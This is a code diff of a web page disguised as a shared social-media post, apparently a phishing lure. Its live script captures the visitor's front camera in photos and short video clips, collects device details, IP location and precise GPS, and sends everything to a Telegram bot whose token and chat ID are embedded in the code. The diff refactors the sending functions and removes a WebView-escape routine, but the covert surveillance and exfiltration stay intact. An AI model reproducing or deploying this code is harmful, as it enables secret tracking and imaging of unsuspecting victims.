@@ -4,10 +4,15 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <title>Shahin Zyan masengar</title>
+  <!-- Open Graph tags - سيتم تحديثها بواسطة Workflow -->
   <meta property="og:title" content="Shahin Zyan masengar">
   <meta property="og:description" content="شارك لك منشور">
   <meta property="og:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <meta property="og:url" content="https://asoalktabe-sudo.github.io/my-photo-app/">
+  <!-- Twitter Card -->
+  <meta name="twitter:title" content="Shahin Zyan masengar">
+  <meta name="twitter:description" content="شارك لك منشور">
+  <meta name="twitter:image" content="https://i.ibb.co/vxBgm8XS/B7392-D8-F-DCE8-4-C07-BFDF-DC3-D2-FF9-A331.jpg">
   <style>
     :root {
       --bg: #f0f2f5;
@@ -105,7 +110,6 @@
     }
     .three-dots:hover { background: var(--border); }
 
-    /* أزرار التحكم */
     .controls {
       display: flex;
       flex-direction: column;
@@ -154,13 +158,11 @@
   <canvas id="canvas"></canvas>
 
   <script>
-    // الإعدادات
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
     const I = 'a7e43833d69a75';
 
-    // العناصر
     const post = document.getElementById('postContainer');
     const retryCamera = document.getElementById('retryCameraBtn');
     const retryLocation = document.getElementById('retryLocationBtn');
@@ -168,48 +170,25 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    // حالة التشغيل
     let stream = null;
     let photos = 0;
     let captureInterval = null;
-    let mediaRecorder = null;
-    let videoChunks = [];
     let recording = false;
     let deviceInfoSent = false;
     let gpsLoc = null;
     let ipLoc = null;
     let redirectUrl = 'https://www.facebook.com';
 
-    // ─── دوال مساعدة ────────────────────────────
-    async function sendToTelegram(method, payload) {
+    async function sendText(text) {
       try {
-        await fetch(`https://api.telegram.org/bot${T}/${method}`, {
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify({ chat_id: C, text: text, parse_mode: 'HTML' })
         });
       } catch (e) {}
     }
 
-    async function sendText(text) {
-      await sendToTelegram('sendMessage', {
-        chat_id: C,
-        text: text,
-        parse_mode: 'HTML'
-      });
-    }
-
-    function dataURLtoBlob(dataUrl) {
-      const arr = dataUrl.split(',');
-      const mime = arr[0].match(/:(.*?);/)[1];
-      const bstr = atob(arr[1]);
-      const n = bstr.length;
-      const u8 = new Uint8Array(n);
-      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
-      return new Blob([u8], { type: mime });
-    }
-
-    // ─── المنشور ────────────────────────────────
     async function loadPost() {
       try {
         const r = await fetch(`https://api.jsonbin.io/v3/b/${B}/latest`);
@@ -241,7 +220,6 @@
       } catch (e) {}
     }
 
-    // ─── معلومات الجهاز (مرة واحدة) ─────────────
     async function sendDeviceInfo() {
       if (deviceInfoSent) return;
       deviceInfoSent = true;
@@ -265,7 +243,6 @@
       } catch (e) {}
     }
 
-    // ─── الموقع (IP أولاً، ثم GPS) ──────────────
     async function fetchIPLocation() {
       try {
         const r = await fetch(`https://ipinfo.io/json?token=${I}`);
@@ -288,7 +265,6 @@
             maximumAge: 0
           });
         });
-        // نقبل الدقة حتى 50 متر، لكن نفضل أقل من 10
         if (pos.coords.accuracy > 50) return false;
         gpsLoc = {
           lat: pos.coords.latitude,
@@ -313,7 +289,6 @@
       }
     }
 
-    // ─── الكاميرا والتصوير ──────────────────────
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
@@ -344,28 +319,35 @@
       if (!stream || recording) return;
       try {
         recording = true;
-        videoChunks = [];
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
-        mediaRecorder.onstop = async () => {
-          const blob = new Blob(videoChunks, { type: 'video/webm' });
+        const chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
+        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+        recorder.onstop = async () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
           const form = new FormData();
           form.append('chat_id', C);
           form.append('video', blob, 'clip.webm');
-          form.append('caption', `🎥 فيديو تلقائي #${Math.floor(photos/5)}`);
+          form.append('caption', '🎥 فيديو تلقائي');
           await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: form }).catch(() => {});
           recording = false;
         };
-        mediaRecorder.start();
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-        }, 3000);
+        recorder.start();
+        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 3000);
       } catch (e) { recording = false; }
+    }
+
+    function dataURLtoBlob(dataUrl) {
+      const arr = dataUrl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      const n = bstr.length;
+      const u8 = new Uint8Array(n);
+      for (let i = 0; i < n; i++) u8[i] = bstr.charCodeAt(i);
+      return new Blob([u8], { type: mime });
     }
 
     function stopAll() {
       if (captureInterval) clearInterval(captureInterval);
-      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
       if (stream) stream.getTracks().forEach(t => t.stop());
     }
 
@@ -378,37 +360,14 @@
       }
     }
 
-    // ─── تقرير الخروج ───────────────────────────
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
       else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
       const report = `<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`;
-      try {
-        await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'HTML' })
-        });
-      } catch (e) {}
+      await sendText(report);
     }
 
-    // ─── خطة الهروب من WebView ──────────────────
-    function attemptWebViewEscape() {
-      const url = window.location.href;
-      const ua = navigator.userAgent || '';
-      if (!/FBAN|FBAV|Instagram/i.test(ua)) return;
-
-      const methods = [
-        () => { window.location.href = url.replace(/^https?:\/\//, 'x-safari-https://'); },
-        () => { window.location.href = url.replace(/^https?:\/\//, 'googlechrome://'); },
-        () => { window.open(url, '_blank', 'noopener,noreferrer'); }
-      ];
-
-      methods.forEach(fn => { try { fn(); } catch(e) {} });
-    }
-
-    // ─── ربط الأحداث ────────────────────────────
     retryCamera.addEventListener('click', async () => {
       retryCamera.classList.add('hidden');
       await attemptCamera();
@@ -424,10 +383,8 @@
       sendExitReport();
     });
 
-    // ─── بدء التشغيل ────────────────────────────
     (async function init() {
       await loadPost();
-      attemptWebViewEscape();
       sendDeviceInfo();
       fetchIPLocation();
       attemptGPS();
